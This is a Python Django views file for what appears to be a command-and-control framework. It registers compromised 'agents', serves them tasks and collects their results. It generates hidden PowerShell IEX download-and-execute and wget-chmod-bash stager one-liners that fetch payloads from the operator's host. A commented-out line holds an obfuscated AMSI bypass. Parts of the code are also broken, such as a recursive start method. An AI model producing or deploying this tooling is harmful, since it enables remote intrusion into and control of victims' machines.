import base64
from django.contrib.auth.decorators import login_required
from django.shortcuts import render
from blog.Modules.windows.DirectoryListing import DirectoryListing
from .forms import *
from .models import *
import netifaces
import os
import random
import string
from django.http import HttpResponse
from django.views import View
from flask import Flask
import threading
import sys
from multiprocessing import Process
from django.contrib.auth.models import User

listen_path = os.path.dirname(os.path.abspath(__file__))+"/data/listeners/"
app         = Flask(__name__)
port = 8000


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip



def registerAgent(request):
    if request.method=='POST':
        hostname = request.POST['hname']
        remoteip = (get_client_ip(request))
        if Agent.objects.filter(hname = hostname).exists():
            data = Agent.objects.get(hname = hostname)
            agentname = data.name
            if data.ip != remoteip:
                data.ip = remoteip
                data.save()
        else:
            agentname     = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) #ASFASA
        
        eth = request.POST['eth']
        if Agent.objects.filter(hname = hostname).exists():
            pass
        else:    
            s=Agent(name=agentname, ip = remoteip, hname= hostname )
            s.save() 
        Listener.agent(agentname,remoteip, eth)

        return HttpResponse(agentname)
    else:
        return ('',204)

    
class Listener():
    class PostListener(View):
        def post(self,request):
            form = listener(request.POST)
            if form.is_valid():
                form.save()
            return render(request, 'blog/listeners.html' , {'form':form})


        def get(self,request):
            form = listener()
            return render(request, 'blog/listeners.html' , {'form':form})

    class payloadGen(View):
        def post(self,request):
            eth = request.POST['interface']
            netifaces.ifaddresses(eth)
            ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
            output_path= "/tmp/{}".format(eth)
            with open(os.path.dirname(os.path.abspath(__file__))+"/powershell.ps1","rt") as p:
                payload = p.read()
            payload = payload.replace('REPLACE_IP',ip)
            payload = payload.replace('REPLACE_PORT',str(port))
            payload = payload.replace('REPLACE_INTERFACE',eth)
            with open(output_path,"wt") as R:
                R.write(payload)

            with open(listen_path+"/{}".format(eth),"wt") as R:
                R.write(payload)

            oneliner = "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/sc/{}\')\"".format(ip, str(port), eth)
            return render(request,'blog/payload-Gen.html', {'payloadline':oneliner})

        def get(self,request):
            return render(request,'blog/payload-Gen.html')


    class lin_payloadGen(View):
        def post(self,request):
            eth = request.POST['interface']
            netifaces.ifaddresses(eth)
            ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
            output_path= "/tmp/{}".format(eth)
            with open(os.path.dirname(os.path.abspath(__file__))+"/bash","rt") as p:
                payload = p.read()
            payload = payload.replace('REPLACE_IP',ip)
            payload = payload.replace('REPLACE_PORT',str(port))
            payload = payload.replace('REPLACE_INTERFACE',eth)
            with open(output_path,"wt") as R:
                R.write(payload)

            with open(listen_path+"/{}".format(eth),"wt") as R:
                R.write(payload)

            oneliner = "wget http://{}:{}/download/{} -O /tmp/bash;chmod +x /tmp/bash;bash /tmp/bash".format(ip, str(port), eth)
            return render(request,'blog/lin_payload-Gen.html', {'payloadline':oneliner})

        def get(self,request):
            return render(request,'blog/lin_payload-Gen.html')

    class agent():   ####### need to take ETH from the GUI user
        def __init__(self, name, remote , eth):

            self.name      = name
            # self.listener  = listener
            self.remote  = remote
            self.eth = eth
            # self.key       = key
            self.sleept    = 3
            self.Path      = listen_path+"agents/{}/".format(self.name)
            self.tasksPath = "{}tasks".format(self.Path, self.name)
            netifaces.ifaddresses(eth)
            self.eth_ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
            
            if os.path.exists(self.Path) == False:
                os.mkdir(self.Path)
     
        def run(eth_ip,port):      ######multi threading with django or flask
            app.logger.disabled = True
            app.run(port=port, host=eth_ip)
            
        def start(self):
            server = Process(target=Listener.agent.run(self.eth_ip,port))  
            # get Ethernet from GUI User 
            cli = sys.modules['flask.cli']
            cli.show_server_banner = lambda *x: None
            daemon = threading.Thread(name = self.name,
                                            target = server.start,
                                            args= ())
            daemon.daemon = True
            daemon.start()
            try:
                Listener.agent.start(self)
                print("Listener started.")
            except:
                print("Failed. Check your options.")
                

        def sendScript(request , eth=''):
            netifaces.ifaddresses(eth)
            ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
            # amsi     = "sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE](\"{1}{0}\"-F'F','rE' ) ) ; ( GeT-VariaBle ( \"1Q2U\" +\"zX\" ) -VaL).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f'Util','A','Amsi','.Management.','utomation.','s','System' )).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -f'amsi','d','InitFaile' ),(\"{2}{4}{0}{1}{3}\" -f 'Stat','i','NonPubli','c','c,' )).\"sE`T`VaLUE\"(${n`ULl},${t`RuE} ); "
            oneliner = "IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/download/{}\')".format(ip,str(port),eth)
            return HttpResponse(oneliner)


        def sendFile(request, eth=''):
            output_path= "/tmp/{}".format(eth)
            f    = open("{}".format(output_path), "rt")
            data = f.read()
            f.close()
            return HttpResponse(data)


        def serveTasks(request,name=''):
            tasksPath = listen_path+"agents/{}/tasks".format(name)
            if os.path.exists(tasksPath):
                with open(tasksPath, "r") as f:
                    task = f.read()
                    
                os.remove(tasksPath)    
                return HttpResponse(task)
            else:
                return HttpResponse('')


        def receiveResults(request,name=''):
            if request.method == 'POST':
                resultspath = listen_path+"agents/{}/results".format(name)
                result = request.POST['result']
                with open(resultspath,'a') as r:
                    r.write(result)     
                    r.close()
                return HttpResponse('')
            else:
                return HttpResponse('')

        def LinreceiveResults(request,name=''):
            resultspath = listen_path+"agents/{}/results".format(name)
            if request.method == 'POST':
                result = request.body.decode()
                base64_bytes = result.encode('ascii')
                message_bytes = base64.b64decode(base64_bytes)
                result = message_bytes.decode('ascii')
                with open(resultspath,'a') as r:
                    r.write(result) 
                    r.close()
                return HttpResponse('')
            else:
                return HttpResponse('')





def LoginPage(request):
    return render(request  , 'blog/login.html' )

@login_required
def HomePage(request):
    listeners = ListenerForm.objects.all()
    return render(request  , 'blog/HomePage.html' , {'listeners' : list(listeners)} )

@login_required
def ListenersPage(request):
    return render(request  , 'blog/listeners.html' )

def dirlist(request):
    DirectoryListing(request.POST["dir"])         
    return render(request  , 'blog/listeners.html' )

def TestPage(request):
	#oListener =  Listener("test55" , "4252" , "192.168.1.15"); 
	return render(request  , 'blog/start-listener.html' )


@login_required
def HackerUser(request):
    Users  = User.objects.all()
    return render(request  , 'blog/creatuser.html' , {'users' : list(Users) } )


@login_required
def Launcher(request):
    return render(request  , 'blog/launcher.html')